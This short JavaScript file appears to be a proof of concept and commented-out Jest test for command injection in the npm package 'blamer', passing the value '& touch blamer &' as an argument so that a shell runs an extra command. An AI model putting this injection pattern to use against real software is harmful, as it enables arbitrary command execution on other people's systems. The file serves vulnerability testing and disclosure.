const Root = require("blamer");
let attack_command = "& touch blamer &";
root = new Root("git", attack_command);
root.blameByFile("./");

// test("Command Injection in blamer", async () => {
//   expect.assertions(2);
//   const Root = require("blamer");
//   const fs = require("fs");
//   const path = "./blamer";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   let attack_command = "& touch blamer &";
//   root = new Root("git", attack_command);
//   try {
//     await root.blameByFile("./");
//   } catch (err) {
//   } finally {
//     file_exist = fs.existsSync(path);
//     expect(file_exist).toBe(true);
//     fs.unlink(path, function (err) {});
//   }
// });
